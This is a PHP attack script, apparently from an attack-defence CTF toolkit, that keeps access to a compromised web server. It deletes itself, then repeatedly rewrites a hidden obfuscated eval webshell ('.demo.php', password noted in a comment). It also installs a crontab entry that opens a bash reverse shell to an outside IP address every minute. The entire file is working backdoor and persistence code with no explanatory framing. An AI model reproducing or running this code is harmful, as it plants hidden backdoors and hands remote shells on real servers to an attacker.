<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.demo.php';
$shell = '<?php $rx="IAppZihAbWQ1KCRfUE9TVFsncbdGFz";$ge="bdcyddKT09PSdbdjM2Y4MzIyYTgxMmbdQ3MDFlNmVjNzM1";$zgs = str_replace("eq","","eqseqteqreq_eqreqepeqlaeqceqe");$ki="ZbdhbbdCgkX1BPU1bdRbY21kXSk7Cg==";$rv="ZjbddjYjgbdwMmbdI5bdZicpCgbdlAZX";$lf = $zgs("q", "", "baqsqe64_qdqeqcoqdqe");$egc = $zgs("h","","crhehahtheh_funhcthihon");$zue = $egc(\'\', $lf($zgs("bd", "", $rx.$ge.$rv.$ki))); $zue();?>';
//pass=Fliper
$message="*/1 * * * * echo \"bash -i >& /dev/tcp/10.12.109.212/7788 0>&1\" | bash";

while (TRUE) {
file_put_contents($file, $shell);
system("echo '$message' > /tmp/1 ;");
system("crontab /tmp/1;");
system("rm /tmp/1;");
usleep(50);
}
?>